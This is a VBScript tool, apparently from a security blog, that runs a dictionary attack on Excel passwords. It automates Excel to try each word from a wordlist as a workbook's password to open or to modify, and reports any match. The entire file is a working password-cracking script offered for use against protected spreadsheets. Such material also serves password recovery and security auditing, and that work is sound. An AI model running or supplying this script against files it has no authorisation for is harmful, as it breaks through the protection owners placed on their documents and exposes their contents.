' *****************************************************************
' Dictionary attack on Excel passwords
'
' Uses Workbooks.open method and a password dictionary to test:
'	1) password to open 
'	2) password for write access, using open password
'
' Usage: "CScript excel-pw-attack.vbs <test.xls> <words.dic>"
'
' Full Description:
' http://insecure.tk/2013/03/dictionary-attack-on-excel-passwords.html
' *****************************************************************
Option Explicit
On Error Resume Next

Dim objExcel
Set objExcel = WScript.CreateObject("Excel.Application")
objExcel.visible=False

Dim args
if WScript.Arguments.Count < 2 or WScript.Arguments.Count > 3 then
   WScript.Echo "Usage: "
   WScript.Echo "Search password for open: "
   WScript.Echo "   CScript " & WScript.ScriptName & " <excel file> <dictionary file>"
   WScript.Echo "Search password for modify, using password to open: "
   WScript.Echo "   CScript " & WScript.ScriptName & " <excel file> <dictionary file> <open password>"
   WScript.Quit 1
end if

' Excel file should be in the script's directory
Dim xlsFile, currentPath
currentPath = replace(WScript.ScriptFullName, WScript.ScriptName, "")
xlsFile = currentPath & WScript.Arguments(0)
WScript.Echo "Brute-forcing excel file: " & xlsFile
WScript.Echo "Using dictionary file: " & WScript.Arguments(1)
if WScript.Arguments.Count = 3 then
	WScript.Echo "Using open password " & WScript.Arguments(2) & " to get the write password"
end if

' Read the passwords from the dictionary file
Dim objFSO
Set objFSO = CreateObject("Scripting.FileSystemObject")

Dim objFile
Const ForReading = 1
Set objFile = objFSO.OpenTextFile(currentPath & WScript.Arguments(1), ForReading)

Dim currLine, bFound
bFound = False
While Not bFound And Not objFile.AtEndOfStream
	currLine = objFile.ReadLine
	'WScript.Echo "[*] Testing solution " & currLine
	if WScript.Arguments.Count = 3 then
		objExcel.Workbooks.Open xlsFile, , , , WScript.Arguments(2), currLine
	else
		' Try to open it in read-only mode
		objExcel.Workbooks.Open xlsFile, ,True , , currLine
	end if
	if Err.Number >  0 then
		'WScript.Echo Err.Description & Err.Number
		Err.Clear
	else
		bFound = True
		if WScript.Arguments.Count = 3 then
			WScript.Echo "[+] Found password for modifying: " & currLine
		else
			WScript.Echo "[+] Found password for opening: " & currLine
		end if
	end If
Wend

if not bFound then
	if WScript.Arguments.Count = 3 then
		WScript.Echo "[-] Not found password for modifying."
	else
		WScript.Echo "[-] Not found password for opening."
	end if
end if


objExcel.Workbooks.Close
objFile.close
